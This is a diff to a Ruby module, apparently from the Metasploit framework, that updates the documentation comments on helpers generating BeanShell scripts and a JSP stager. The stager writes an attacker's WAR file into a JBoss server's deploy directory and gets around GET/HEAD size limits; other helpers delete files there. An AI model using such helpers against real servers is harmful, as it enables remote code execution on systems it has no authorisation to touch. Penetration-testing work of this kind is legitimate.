@@ -1,9 +1,12 @@
 # -*- coding: binary -*-
+
 module Msf::HTTP::JBoss::BeanShellScripts
   
-  # Generate a BSH script
+  # Generates a Bean Shell Script.
+  #
+  # @param type [Symbol] The Bean Shell script type, `:create` or `:delete`.
   # @param opts [Hash] Hash of configuration options.
-  # @return [String] A BSH script 
+  # @return [String] A Bean Shell script.
   def generate_bsh(type, opts ={})
     bean_shell = nil
     case type
@@ -16,10 +19,11 @@ module Msf::HTTP::JBoss::BeanShellScripts
     bean_shell
   end
 
-  # Generate a stager to write the exploded WAR file to the deploy/
-  # directory. This is used to bypass the size limit for GET/HEAD requests
-  # @param [String] The name of the app to deploy
-  # @return [String] The jsp stager
+  # Generate a stager JSP to write a WAR file to the deploy/ directory.
+  # This is used to bypass the size limit for GET/HEAD requests.
+  #
+  # @param app_base [String] The name of the WAR app to write.
+  # @return [String] The JSP stager.
   def stager_jsp(app_base)
     decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
     file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
@@ -51,9 +55,15 @@ module Msf::HTTP::JBoss::BeanShellScripts
     stager_jsp
   end
 
-  # Generate a BSH script to deploy the WAR 
-  # @param opts [Hash] Hash of configuration options.
-  # @return [String] A BSH script to deploy the WAR 
+  # Generate a Bean Shell script which creates files inside the JBOSS's deploy
+  #   directory.
+  #
+  # @param opts [Hash] Hash containing the options to create the Bean Shell
+  #   Script.
+  # @option opts :dir [Symbol] The dir where place the file.
+  # @option opts :file [Symbol] The file path.
+  # @option opts :contents [Symbol] The file contents.
+  # @return [String] A Bean Shell script to create the file.
   def create_file_bsh(opts = {})
     dir = opts[:dir]
     file = opts[:file]
@@ -75,13 +85,15 @@ fstream.write(byteval);
 fstream.close();
     EOT
 
-    vprint_status("Creating deploy/#{file} via BSHDeployer")
     payload_bsh_script
   end
 
-  # Generate a BSH script to delete an application 
-  # @param opts [Hash] Hash of configuration options.
-  # @return [String] A BSH script to delete an application
+  # Generate a Bean Shell script to delete files from the JBoss's /deploy
+  #   directory.
+  #
+  # @param opts [Hash] Hash containing the files to delete, the values are
+  #   the files paths.
+  # @return [String] A Bean Shell script to delete files.
   def delete_files_bsh(opts = {})
     script = "String jboss_home = System.getProperty(\"jboss.server.home.dir\");\n"
     opts.values.each do |v|
